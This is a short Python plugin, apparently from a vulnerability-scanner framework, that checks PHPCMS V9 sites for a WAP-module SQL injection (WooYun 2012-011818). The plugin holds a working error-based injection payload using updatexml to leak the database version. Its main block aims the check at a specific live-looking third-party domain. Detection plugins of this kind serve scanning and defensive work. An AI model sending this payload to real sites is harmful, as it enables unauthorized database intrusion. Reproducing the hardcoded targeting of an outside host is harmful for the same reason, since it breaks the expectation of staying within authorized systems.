#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2012-011818
#PHPCMS V9 WAP模块注入漏洞

def assign(service,arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
	payload = "index.php?m=wap&c=index&a=comment_list&commentid=content_12%2527%20or%20updatexml(1,concat(0x7e,(version())),0)%23-84-1"
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "MySQL Query" in res:
			security_hole('find sql injection: ' + arg+'index.php')

if __name__ == "__main__":
	from dummy import *
	audit(assign('phpcms', 'http://9expo.gzdsw.com/')[1])